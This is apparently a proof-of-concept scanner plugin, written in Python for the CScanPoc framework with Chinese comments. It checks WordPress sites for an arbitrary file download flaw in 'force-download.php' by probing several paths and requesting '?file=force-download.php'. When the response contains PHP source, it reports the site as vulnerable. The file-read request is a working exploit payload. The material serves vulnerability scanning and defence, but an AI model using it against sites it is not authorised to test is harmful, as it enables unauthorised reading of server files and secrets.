# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'WordPress_0078'  # 平台漏洞编号，留空
    name = 'WordPress force download Arbitrary File Download'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2016-08-07'  # 漏洞公布时间
    desc = '''
        WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
        WordPress force download Arbitrary File Download
    '''  # 漏洞描述
    ref = 'https://cxsecurity.com/issue/WLB-2016080079'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7781639f-8692-437f-837c-a72e4ecb1f9f'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            payload_list = ['/force-download.php', '/wp/wp-content/force-download.php', '/wp-content/force-download.php',
                            '/wp-content/themes/ucin/includes/force-download.php', '/wp-content/uploads/patientforms/force-download.php']
            for payload in payload_list:
                verify_url = url + payload
                code, head, res, errcode, _ = hh.http(verify_url)
                if code == 200:
                    final_url = verify_url + '?file=force-download.php'
                    code, head, res, errcode, _ = hh.http(final_url)
                    if '<?php' in res:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞;url={url}'.format(
                            target=self.target, name=self.vuln.name, url=final_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
